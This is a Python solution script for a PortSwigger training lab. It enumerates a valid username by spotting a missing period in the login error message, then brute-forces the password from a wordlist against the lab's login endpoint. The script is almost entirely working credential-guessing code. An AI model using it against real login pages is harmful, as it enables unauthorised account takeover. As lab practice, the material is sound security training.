#this is a portswigger lab where you are supposed to crack the username and password by noting different responses in the error code.  for the username, the different response indicating a correct username is a missing period in "invalid username and password."  Once you have the username, then run it with a password list to crack.
#!/usr/bin/python3
import requests
import os
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

warnings.simplefilter('ignore',InsecureRequestWarning) #ignores insecure certificate warning

def user_crack():
	with open("usernames","r") as f:
		for line in f:
			for word in line.split():
				response = requests.post('https://0a3100d6033e364ac1f79b4a002a00eb.web-security-academy.net/login', data = {'username' : word, 'password' : 'password'}, proxies=proxy, verify=False)
			if 'Invalid username or password.' not in response.text:
				print("Username is " + word)
				global user
				user = word
				return()
				break


def pass_crack():
	with open("passwords","r") as f:
		for line in f:
			for word in line.split():
				response = requests.post('https://0a3100d6033e364ac1f79b4a002a00eb.web-security-academy.net/login', data = {'username' : user, 'password' : word}, proxies=proxy, verify=False)
			if 'Invalid username or password' not in response.text:
				print("Passsword is " + word)
				global password
				password = word
				return(password)
				break


user_crack()
pass_crack()
